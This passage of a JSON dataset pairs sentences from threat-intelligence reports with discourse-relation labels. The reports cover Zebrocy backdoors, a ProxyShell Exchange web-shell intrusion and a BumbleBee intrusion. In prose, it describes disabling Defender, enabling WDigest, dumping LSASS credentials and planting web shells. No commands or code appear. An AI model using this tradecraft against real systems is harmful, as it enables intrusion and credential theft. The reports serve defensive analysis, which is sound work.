        "S1": "The shortened URL leads the victim to an IP-address-based URL, where the archived payload is located.",
        "S2": "Unfortunately, without the email message, we don\u2019t know if there are any instructions for the user, if there is any further social engineering, or if it relies solely on the victim\u2019s curiosity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Unfortunately, without the email message, we don\u2019t know if there are any instructions for the user, if there is any further social engineering, or if it relies solely on the victim\u2019s curiosity.",
        "S2": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "relation": "MISC"
    },
    {
        "S1": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "S2": "Note there is a typo in the executable\u2019s filename; it should be \u201c\u0414\u041e\u0412I\u0414\u041d\u0418\u041a\u201d instead of \u201c\u0414\u041e\u0412I\u0414\u041dI\u041a\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note there is a typo in the executable\u2019s filename; it should be \u201c\u0414\u041e\u0412I\u0414\u041d\u0418\u041a\u201d instead of \u201c\u0414\u041e\u0412I\u0414\u041dI\u041a\u201d.",
        "S2": "Once the binary is executed, a password prompt dialog box opens.",
        "relation": "MISC"
    },
    {
        "S1": "Once the binary is executed, a password prompt dialog box opens.",
        "S2": "The result of the password validation will always be wrong, but after the apparent validation attempt, the decoy PDF document is opened.",
        "relation": "NEXT"
    },
    {
        "S1": "The result of the password validation will always be wrong, but after the apparent validation attempt, the decoy PDF document is opened.",
        "S2": "That document appears to be empty, but the downloader, which is written in Delphi, continues running in the background.",
        "relation": "NEXT"
    },
    {
        "S1": "That document appears to be empty, but the downloader, which is written in Delphi, continues running in the background.",
        "S2": "The IP address is also used in the URL hardcoded into the first binary downloader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The IP address is also used in the URL hardcoded into the first binary downloader.",
        "S2": "The Stage-1 downloader will download and execute a new downloader, written in C++, not so different from other Zebrocy downloaders.",
        "relation": "MISC"
    },
    {
        "S1": "The Stage-1 downloader will download and execute a new downloader, written in C++, not so different from other Zebrocy downloaders.",
        "S2": "Once again this downloader is as straightforward as the Zebrocy gang\u2019s other downloaders.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once again this downloader is as straightforward as the Zebrocy gang\u2019s other downloaders.",
        "S2": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.",
        "S2": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "relation": "MISC"
    },
    {
        "S1": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "S2": "These blobs contain the different parts of the configuration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These blobs contain the different parts of the configuration.",
        "S2": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "relation": "MISC"
    },
    {
        "S1": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "S2": "Hence, the time between the victim running the downloader and the operators\u2019 first commands",
        "relation": "ELABORATION"
    },
    {
        "S1": "Hence, the time between the victim running the downloader and the operators\u2019 first commands",
        "S2": "is only a few minutes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "is only a few minutes.",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": "MISC"
    },
    {
        "S1": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "S2": "The commands available are located in one of the configuration blobs mentioned earlier (the \u201ccommands\u201d blob in Figure 3).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The commands available are located in one of the configuration blobs mentioned earlier (the \u201ccommands\u201d blob in Figure 3).",
        "S2": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "S2": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "S2": "The first set of commands gathers information about the victim\u2019s computer and environment:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first set of commands gathers information about the victim\u2019s computer and environment:",
        "S2": "The commands above are commonly executed when the operators first connect to a newly activated backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The commands above are commonly executed when the operators first connect to a newly activated backdoor.",
        "S2": "They don\u2019t have any arguments, and they are quite self-explanatory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They don\u2019t have any arguments, and they are quite self-explanatory.",
        "S2": "Other commands commonly seen executed shortly after these backdoors are activated, listed below:",
        "relation": "MISC"
    },
    {
        "S1": "Other commands commonly seen executed shortly after these backdoors are activated, listed below:",
        "S2": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "S2": "This information is requested within a few minutes of initial compromise and the amount of data the operator will have to deal with is quite considerable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This information is requested within a few minutes of initial compromise and the amount of data the operator will have to deal with is quite considerable.",
        "S2": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "relation": "NEXT"
    },
    {
        "S1": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "S2": "The current dumpers have some similarities with those previously used by the group.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The current dumpers have some similarities with those previously used by the group.",
        "S2": "In this case, Yandex Browser, Chromium, 7Star Browser (a Chromium-based browser), and CentBrowser are targeted, as well as versions of Microsoft Outlook from 1997 through 2016:",
        "relation": "MISC"
    },
    {
        "S1": "In this case, Yandex Browser, Chromium, 7Star Browser (a Chromium-based browser), and CentBrowser are targeted, as well as versions of Microsoft Outlook from 1997 through 2016:",
        "S2": "These dumpers create log files indicating the presence or absence of potential databases to dump:",
        "relation": "MISC"
    },
    {
        "S1": "These dumpers create log files indicating the presence or absence of potential databases to dump:",
        "S2": "The current dumper contains the following output when there are no databases to dump:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The current dumper contains the following output when there are no databases to dump:",
        "S2": "These dumpers are quickly removed once they have done their job.",
        "relation": "NEXT"
    },
    {
        "S1": "These dumpers are quickly removed once they have done their job.",
        "S2": "Moreover, the backdoor contains a list of filenames related to credentials from software listed below (database names):",
        "relation": "MISC"
    },
    {
        "S1": "Moreover, the backdoor contains a list of filenames related to credentials from software listed below (database names):",
        "S2": "The operators take care of retrieving these databases if they are present on the victim\u2019s computer.",
        "relation": "MISC"
    },
    {
        "S1": "The operators take care of retrieving these databases if they are present on the victim\u2019s computer.",
        "S2": "The operators retrieve these files on the machine using the DOWNLOAD_LIST command.",
        "relation": "MISC"
    },
    {
        "S1": "The operators retrieve these files on the machine using the DOWNLOAD_LIST command.",
        "S2": "This command can be used when the operators are aware of the presence of interesting files on the computer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This command can be used when the operators are aware of the presence of interesting files on the computer.",
        "S2": "Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor.",
        "S2": "This backdoor is executed using the CMD_EXECUTE command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This backdoor is executed using the CMD_EXECUTE command:",
        "S2": "There are some interesting facts here.",
        "relation": "MISC"
    },
    {
        "S1": "There are some interesting facts here.",
        "S2": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "relation": "NEXT"
    },
    {
        "S1": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "S2": "Second, the hex-encoded string is the C&C used by the custom backdoor while in the Delphi backdoor the C&C is embedded in the configuration.",
        "relation": "NEXT"
    },
    {
        "S1": "Second, the hex-encoded string is the C&C used by the custom backdoor while in the Delphi backdoor the C&C is embedded in the configuration.",
        "S2": "The two Delphi backdoors, the common one and the one above, are quite similar but contain these interesting tweaks:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The two Delphi backdoors, the common one and the one above, are quite similar but contain these interesting tweaks:",
        "S2": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "S2": "The detection ratio is definitely lower in comparison to the \u201cusual\u201d backdoor.",
        "relation": "MISC"
    },
    {
        "S1": "The detection ratio is definitely lower in comparison to the \u201cusual\u201d backdoor.",
        "S2": "The very short timeframe where this backdoor is on the system and operating makes it harder to retrieve.",
        "relation": "MISC"
    },
    {
        "S1": "The very short timeframe where this backdoor is on the system and operating makes it harder to retrieve.",
        "S2": "Once its operators complete their evil deeds, they quickly remove it.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors activity occurred in two bursts within a 3 day time frame.",
        "S2": "As with our previous case, they started by uploading their web shell and disabling antivirus services.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with our previous case, they started by uploading their web shell and disabling antivirus services.",
        "S2": "Soon after, they established two persistence methods.",
        "relation": "NEXT"
    },
    {
        "S1": "Soon after, they established two persistence methods.",
        "S2": "The first was through scheduled tasks, and the second, was via a newly created account.",
        "relation": "NEXT"
    },
    {
        "S1": "The first was through scheduled tasks, and the second, was via a newly created account.",
        "S2": "The account was then added to the \u201cremote desktop users\u201d and \u201clocal administrators users\u201d groups.",
        "relation": "NEXT"
    },
    {
        "S1": "The account was then added to the \u201cremote desktop users\u201d and \u201clocal administrators users\u201d groups.",
        "S2": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "relation": "NEXT"
    },
    {
        "S1": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "S2": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "relation": "NEXT"
    },
    {
        "S1": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "S2": "At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.",
        "S2": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "S2": "The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.",
        "S2": "Two days later, we saw the threat actors reappear.",
        "relation": "MISC"
    },
    {
        "S1": "Two days later, we saw the threat actors reappear.",
        "S2": "We expected them to pick up where they left off, however, they repeated all previous actions.",
        "relation": "NEXT"
    },
    {
        "S1": "We expected them to pick up where they left off, however, they repeated all previous actions.",
        "S2": "Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.",
        "S2": "No further activity was observed as the threat actors were evicted from the network.",
        "relation": "NEXT"
    },
    {
        "S1": "No further activity was observed as the threat actors were evicted from the network.",
        "S2": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:",
        "relation": "MISC"
    },
    {
        "S1": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:",
        "S2": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.",
        "S2": "Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:",
        "S2": "The threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension.",
        "S2": "While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.",
        "S2": "In an attempt to hide the actions taken, the actor removes the request just created:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In an attempt to hide the actions taken, the actor removes the request just created:",
        "S2": "This activity then repeated approximately 2 days after the initial exploitation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity then repeated approximately 2 days after the initial exploitation.",
        "S2": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "S2": "Below is the second web shell created that shares the same naming convention as the first.",
        "relation": "MISC"
    },
    {
        "S1": "Below is the second web shell created that shares the same naming convention as the first.",
        "S2": "Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.",
        "S2": "The web shell followed a similar structure seen in previous cases.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The web shell followed a similar structure seen in previous cases.",
        "S2": "At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran.",
        "relation": "MISC"
    },
    {
        "S1": "At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran.",
        "S2": "The web shell had predefined functions for special actions:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The web shell had predefined functions for special actions:",
        "S2": "- get \u2013 Get file from location on disk (additional dst POST parameter)",
        "relation": "ELABORATION"
    },
    {
        "S1": "- get \u2013 Get file from location on disk (additional dst POST parameter)",
        "S2": "- put \u2013 Upload file to location (additional dst POST parameter)",
        "relation": "LIST"
    },
    {
        "S1": "- put \u2013 Upload file to location (additional dst POST parameter)",
        "S2": "- run \u2013 Execute a list of commands separated by \u201c;\u201d using PowerShell.",
        "relation": "LIST"
    },
    {
        "S1": "- run \u2013 Execute a list of commands separated by \u201c;\u201d using PowerShell.",
        "S2": "If exec_code does not start with one of the above commands, it will simply attempt to run it with PowerShell.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If exec_code does not start with one of the above commands, it will simply attempt to run it with PowerShell.",
        "S2": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "S2": "Below you can see an example of commands that were sent and the outputs they returned in the response.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below you can see an example of commands that were sent and the outputs they returned in the response.",
        "S2": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "relation": "MISC"
    },
    {
        "S1": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "S2": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
        "relation": "NEXT"
    },
    {
        "S1": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
        "S2": "Scheduled Task Commands:",
        "relation": "MISC"
    },
    {
        "S1": "Scheduled Task Commands:",
        "S2": "Defender Modification Command:",
        "relation": "LIST"
    },
    {
        "S1": "Defender Modification Command:",
        "S2": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "relation": "MISC"
    },
    {
        "S1": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "S2": "Wininet.bat simply loops through the execution of the file dllhost.exe .",
        "relation": "NEXT"
    },
    {
        "S1": "Wininet.bat simply loops through the execution of the file dllhost.exe .",
        "S2": "The file dllhost.exe is a golang binary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The file dllhost.exe is a golang binary.",
        "S2": "When executed, the binary was observed resolving the following domains:",
        "relation": "MISC"
    },
    {
        "S1": "When executed, the binary was observed resolving the following domains:",
        "S2": "The binary also spawns the following commands when executed:",
        "relation": "NEXT"
    },
    {
        "S1": "The binary also spawns the following commands when executed:",
        "S2": "The binary has a low confidence reference to FRP (FastReverseProxy) as the sample matches the closed source Yara rule \u2013 HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by Florian Roth) however it does not behave in the same way as the open source tool.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The binary has a low confidence reference to FRP (FastReverseProxy) as the sample matches the closed source Yara rule \u2013 HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by Florian Roth) however it does not behave in the same way as the open source tool.",
        "S2": "This file also matches on an additional Yara rule more recently \u2013 APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This file also matches on an additional Yara rule more recently \u2013 APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.",
        "S2": "The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.",
        "S2": "During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:",
        "relation": "MISC"
    },
    {
        "S1": "During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:",
        "S2": "The first thing they did was make a new user named DefaultAccount with the password [email protected] .",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first thing they did was make a new user named DefaultAccount with the password [email protected] .",
        "S2": "They then activated the account and changed the password ( [email protected] ) for the second time.",
        "relation": "NEXT"
    },
    {
        "S1": "They then activated the account and changed the password ( [email protected] ) for the second time.",
        "S2": "Finally the commands added the new account to the Administrators group and Remote Desktop Users group.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally the commands added the new account to the Administrators group and Remote Desktop Users group.",
        "S2": "The threat actors ran the same command again two days later:",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors ran the same command again two days later:",
        "S2": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "S2": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "relation": "MISC"
    },
    {
        "S1": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "S2": "Below, we can observe the content of wininet.xml:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below, we can observe the content of wininet.xml:",
        "S2": "The following commands where then ran to initiate the task and to achieve persistence:",
        "relation": "MISC"
    },
    {
        "S1": "The following commands where then ran to initiate the task and to achieve persistence:",
        "S2": "The scheduled task created by the web shell was set to use",
        "relation": "MISC"
    },
    {
        "S1": "The scheduled task created by the web shell was set to use",
        "S2": "the principal SID \u201cS-1-5-18\u201d, or SYSTEM.",
        "relation": "MISC"
    },
    {
        "S1": "the principal SID \u201cS-1-5-18\u201d, or SYSTEM.",
        "S2": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "relation": "MISC"
    },
    {
        "S1": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "S2": "Windows Defender Behavior Monitoring was disabled.",
        "relation": "NEXT"
    },
    {
        "S1": "Windows Defender Behavior Monitoring was disabled.",
        "S2": "The Severe Threat default action was set to \u2018Allow\u2019.",
        "relation": "NEXT"
    },
    {
        "S1": "The Severe Threat default action was set to \u2018Allow\u2019.",
        "S2": "Realtime Monitoring was disabled.",
        "relation": "NEXT"
    },
    {
        "S1": "Realtime Monitoring was disabled.",
        "S2": "The \u2018C:\\Windows\u2019 path was excluded from scheduled and real-time scanning.",
        "relation": "NEXT"
    },
    {
        "S1": "The \u2018C:\\Windows\u2019 path was excluded from scheduled and real-time scanning.",
        "S2": "A rule was added to the Windows Firewall to allow remote RDP traffic.",
        "relation": "NEXT"
    },
    {
        "S1": "A rule was added to the Windows Firewall to allow remote RDP traffic.",
        "S2": "Remote Desktop Services was started.",
        "relation": "NEXT"
    },
    {
        "S1": "Remote Desktop Services was started.",
        "S2": "The threat actor enabled WDigest authentication.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor enabled WDigest authentication.",
        "S2": "This enforces the storage of credentials in plaintext on future logins.",
        "relation": "NEXT"
    },
    {
        "S1": "This enforces the storage of credentials in plaintext on future logins.",
        "S2": "LSA protection was disabled.",
        "relation": "NEXT"
    },
    {
        "S1": "LSA protection was disabled.",
        "S2": "The threat actor created a process memory dump from LSASS.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor created a process memory dump from LSASS.exe.",
        "S2": "In this case they created a \u201cminidump\u201d using the LOLBIN comsvcs.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "In this case they created a \u201cminidump\u201d using the LOLBIN comsvcs.dll.",
        "S2": "This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.",
        "relation": "NEXT"
    },
    {
        "S1": "This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.",
        "S2": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "S2": "They executed commands such as:",
        "relation": "NEXT"
    },
    {
        "S1": "They executed commands such as:",
        "S2": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
        "S2": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.",
        "S2": "Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command.",
        "relation": "NEXT"
    },
    {
        "S1": "Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command.",
        "S2": "This was likely done as a test.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was likely done as a test.",
        "S2": "While having access to the Exchange server, we observed no attempts to export or access user mailboxes.",
        "relation": "MISC"
    },
    {
        "S1": "While having access to the Exchange server, we observed no attempts to export or access user mailboxes.",
        "S2": "As we saw from the execution section, dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.",
        "relation": "MISC"
    },
    {
        "S1": "As we saw from the execution section, dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.",
        "S2": "This C2 channel was not used very much as most activity was done through the web shell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This C2 channel was not used very much as most activity was done through the web shell.",
        "S2": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.",
        "relation": "MISC"
    },
    {
        "S1": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.",
        "S2": "Here you can see the threat actor using the web shell command to extract it:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here you can see the threat actor using the web shell command to extract it:",
        "S2": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "S2": "Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The intrusion began with the delivery of an ISO file containing a LNK file and a BumbleBee payload in the form of a hidden DLL file.",
        "S2": "A user on a workstation mounted the ISO file and executed the LNK file, running the Bumblebee payload.",
        "relation": "NEXT"
    },
    {
        "S1": "A user on a workstation mounted the ISO file and executed the LNK file, running the Bumblebee payload.",
        "S2": "Around 15 minutes after the execution of BumbleBee, multiple processes were spawned with the goal of injecting Meterpreter into each of them.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 15 minutes after the execution of BumbleBee, multiple processes were spawned with the goal of injecting Meterpreter into each of them.",
        "S2": "After the threat actors gained access with Meterpreter, they began conducting reconnaissance on the workstation and network, including querying domain controllers, mapping domain joined computers, enumerating Active Directory trusts, and listing Domain Admin accounts.",
        "relation": "NEXT"
    },
    {
        "S1": "After the threat actors gained access with Meterpreter, they began conducting reconnaissance on the workstation and network, including querying domain controllers, mapping domain joined computers, enumerating Active Directory trusts, and listing Domain Admin accounts.",
        "S2": "All of this first wave of discovery relied on built in Windows utilities like nltest, arp, net, ping, nbtstat, and nslookup.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All of this first wave of discovery relied on built in Windows utilities like nltest, arp, net, ping, nbtstat, and nslookup.",
        "S2": "BumbleBee executed under a user with local administrator privileges on all workstations in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "BumbleBee executed under a user with local administrator privileges on all workstations in the environment.",
        "S2": "At around six hours after initial execution, we observed a new process created that was then used to host a Cobalt Strike beacon, from the same command and control server observed in a prior BumbleBee case.",
        "relation": "MISC"
    },
    {
        "S1": "At around six hours after initial execution, we observed a new process created that was then used to host a Cobalt Strike beacon, from the same command and control server observed in a prior BumbleBee case.",
        "S2": "This beacon reprised discovery activity, but also cut a common command short net user /dom instead of /domain , whether from keyboard laziness or a trick to trip-up detections.",
        "relation": "NEXT"
    },
    {
        "S1": "This beacon reprised discovery activity, but also cut a common command short net user /dom instead of /domain , whether from keyboard laziness or a trick to trip-up detections.",
        "S2": "The threat actor then used their access to execute procdump via a remote service creation with the intention of dumping credentials from LSASS from an adjacent workstation on the network.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then used their access to execute procdump via a remote service creation with the intention of dumping credentials from LSASS from an adjacent workstation on the network.",
        "S2": "Next, the threat actors moved laterally via RDP to a server.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the threat actors moved laterally via RDP to a server.",
        "S2": "A new local user, sql_admin, was created and added to the local administrator\u2019s group and AnyDesk remote access software was installed.",
        "relation": "NEXT"
    },
    {
        "S1": "A new local user, sql_admin, was created and added to the local administrator\u2019s group and AnyDesk remote access software was installed.",
        "S2": "Through the AnyDesk session, the threat actor was observed connecting to a file share and accessing multiple documents related to cyber insurance and spreadsheets with passwords.",
        "relation": "NEXT"
    },
    {
        "S1": "Through the AnyDesk session, the threat actor was observed connecting to a file share and accessing multiple documents related to cyber insurance and spreadsheets with passwords.",
        "S2": "A second round of enumeration was observed on the beachhead using AdFind, which was executed via the Cobalt Strike beacon on the system.",
        "relation": "NEXT"
    },
    {
        "S1": "A second round of enumeration was observed on the beachhead using AdFind, which was executed via the Cobalt Strike beacon on the system.",
        "S2": "Following this second round of enumeration, the threat actor moved latterly to a server hosting backups, via RDP and interacted with the backup console.",
        "relation": "NEXT"
    },
    {
        "S1": "Following this second round of enumeration, the threat actor moved latterly to a server hosting backups, via RDP and interacted with the backup console.",
        "S2": "From the backup system, the threat actors also opened internet explorer and attempted to load the environment\u2019s mail server, likely checking for Outlook Web Access.",
        "relation": "NEXT"
    },
    {
        "S1": "From the backup system, the threat actors also opened internet explorer and attempted to load the environment\u2019s mail server, likely checking for Outlook Web Access.",
        "S2": "A third round of enumeration, this time taking place from the first lateral server host, was observed via a script named \u20181.bat\u2019 that would ping all computers in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "A third round of enumeration, this time taking place from the first lateral server host, was observed via a script named \u20181.bat\u2019 that would ping all computers in the environment.",
        "S2": "Following this third round of enumeration the threat actors were evicted from the environment and no further impact was observed.",
        "relation": "NEXT"
    },
    {
        "S1": "Following this third round of enumeration the threat actors were evicted from the environment and no further impact was observed.",
        "S2": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "S2": "The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file.",
        "relation": "MISC"
    },
    {
        "S1": "The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file.",
